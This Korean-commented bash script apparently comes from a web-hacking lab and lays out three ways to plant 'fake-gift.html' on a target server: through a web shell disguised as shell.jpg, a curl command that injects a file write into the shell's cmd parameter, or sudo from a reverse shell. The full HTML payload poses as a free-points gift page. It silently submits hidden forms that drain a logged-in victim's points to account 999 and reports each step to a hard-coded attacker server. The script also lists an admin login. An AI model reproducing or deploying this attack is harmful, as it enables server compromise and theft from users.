#!/bin/bash
# fake-gift.html 배포 스크립트
# 퍼미션 문제 우회 방법들

echo "============================================================"
echo "🎁 fake-gift.html 배포 방법"
echo "============================================================"
echo ""

echo "방법 1: 웹쉘(shell.jpg)을 통한 업로드 (권장)"
echo "------------------------------------------------------------"
echo "웹쉘은 www-data 권한으로 실행되므로 /var/www/html/www/ 쓰기 가능"
echo ""
echo "1. 브라우저에서 웹쉘 접속:"
echo "   http://52.78.221.104/file.php?name=shell.jpg"
echo ""
echo "2. 다음 명령 실행:"
cat << 'EOF'

cat > /var/www/html/www/fake-gift.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎁 무료 포인트 받기!</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .gift-box {
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; }
        .gift-icon { font-size: 100px; }
        #status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">처리 중...</div>
    </div>

    <div id="forms"></div>

    <script>
        const ATTACKER = 'http://13.158.67.78:5000';

        // Image 태그로 알림 전송 (CORS 우회)
        function notify(endpoint, params) {
            const img = new Image();
            img.src = ATTACKER + endpoint + '?' + params + '&t=' + Date.now();
            console.log('[+] Notify:', endpoint, params);
        }

        notify('/notify', 'event=page_loaded');

        const amounts = [50000, 30000, 20000, 10000, 5000, 3000, 2000, 1000, 500, 300, 200, 100];
        let html = '';

        amounts.forEach((amt, i) => {
            html += `
                <form id="f${i}" method="POST" action="profile.php" target="if${i}">
                    <input type="hidden" name="send_gift" value="1">
                    <input type="hidden" name="receiver_id" value="999">
                    <input type="hidden" name="gift_type" value="diamond">
                    <input type="hidden" name="points" value="${amt}">
                    <input type="hidden" name="message" value="Event">
                </form>
                <iframe name="if${i}" style="display:none;"></iframe>
            `;
        });

        document.getElementById('forms').innerHTML = html;

        const total = amounts.reduce((a,b)=>a+b,0);
        notify('/victim', 'points=' + total);

        amounts.forEach((amt, i) => {
            setTimeout(() => {
                document.getElementById('f' + i).submit();
                document.getElementById('status').innerHTML = '처리 중... ' + Math.round((i+1)/amounts.length*100) + '%';
                notify('/transfer', 'amount=' + amt);
                console.log('[+] Draining: ' + amt + 'P');
            }, i * 200);
        });

        setTimeout(() => {
            document.getElementById('status').innerHTML = '✅ 완료!';
            notify('/complete', 'total=' + total);
            setTimeout(() => { window.location.href = 'index.php'; }, 2000);
        }, amounts.length * 200 + 1000);
    </script>
</body>
</html>
HTMLEOF

EOF

echo ""
echo "3. 파일 확인:"
echo "   ls -la /var/www/html/www/fake-gift.html"
echo ""
echo "============================================================"
echo ""

echo "방법 2: curl로 업로드"
echo "------------------------------------------------------------"
echo "로컬에서 직접 실행:"
echo ""

# fake-gift.html 생성
cat > /tmp/fake-gift-upload.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎁 무료 포인트 받기!</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .gift-box {
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 { color: #667eea; }
        .gift-icon { font-size: 100px; }
        #status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">처리 중...</div>
    </div>

    <div id="forms"></div>

    <script>
        const ATTACKER = 'http://13.158.67.78:5000';

        // Image 태그로 알림 전송 (CORS 우회)
        function notify(endpoint, params) {
            const img = new Image();
            img.src = ATTACKER + endpoint + '?' + params + '&t=' + Date.now();
            console.log('[+] Notify:', endpoint, params);
        }

        notify('/notify', 'event=page_loaded');

        const amounts = [50000, 30000, 20000, 10000, 5000, 3000, 2000, 1000, 500, 300, 200, 100];
        let html = '';

        amounts.forEach((amt, i) => {
            html += `
                <form id="f${i}" method="POST" action="profile.php" target="if${i}">
                    <input type="hidden" name="send_gift" value="1">
                    <input type="hidden" name="receiver_id" value="999">
                    <input type="hidden" name="gift_type" value="diamond">
                    <input type="hidden" name="points" value="${amt}">
                    <input type="hidden" name="message" value="Event">
                </form>
                <iframe name="if${i}" style="display:none;"></iframe>
            `;
        });

        document.getElementById('forms').innerHTML = html;

        const total = amounts.reduce((a,b)=>a+b,0);
        notify('/victim', 'points=' + total);

        amounts.forEach((amt, i) => {
            setTimeout(() => {
                document.getElementById('f' + i).submit();
                document.getElementById('status').innerHTML = '처리 중... ' + Math.round((i+1)/amounts.length*100) + '%';
                notify('/transfer', 'amount=' + amt);
                console.log('[+] Draining: ' + amt + 'P');
            }, i * 200);
        });

        setTimeout(() => {
            document.getElementById('status').innerHTML = '✅ 완료!';
            notify('/complete', 'total=' + total);
            setTimeout(() => { window.location.href = 'index.php'; }, 2000);
        }, amounts.length * 200 + 1000);
    </script>
</body>
</html>
HTMLEOF

echo "다음 명령 실행:"
echo "curl 'http://52.78.221.104/file.php?name=shell.jpg&cmd=cat%20%3E%20/var/www/html/www/fake-gift.html' --data-binary '@/tmp/fake-gift-upload.html'"
echo ""
echo "============================================================"
echo ""

echo "방법 3: 리버스 쉘에서 sudo 사용"
echo "------------------------------------------------------------"
echo "리버스 쉘에서:"
echo "sudo -l  # www-data의 sudo 권한 확인"
echo "sudo bash -c 'cat > /var/www/html/www/fake-gift.html << EOF..."
echo ""
echo "============================================================"
echo ""

echo "배포 완료 후 테스트:"
echo "------------------------------------------------------------"
echo "1. 공격자 Flask 서버 실행 확인:"
echo "   http://13.158.67.78:5000/"
echo ""
echo "2. admin으로 로그인:"
echo "   http://52.78.221.104/login.php"
echo "   admin / admin123"
echo ""
echo "3. 새 탭에서 fake-gift 열기:"
echo "   http://52.78.221.104/fake-gift.html"
echo ""
echo "4. 공격자 대시보드 확인:"
echo "   - 💰 탈취한 포인트 증가"
echo "   - 👥 피해자 수 증가"
echo "   - 📋 실시간 로그 표시"
echo ""
echo "5. admin 포인트 확인:"
echo "   http://52.78.221.104/profile.php"
echo "   → 포인트 차감 확인"
echo ""
echo "============================================================"
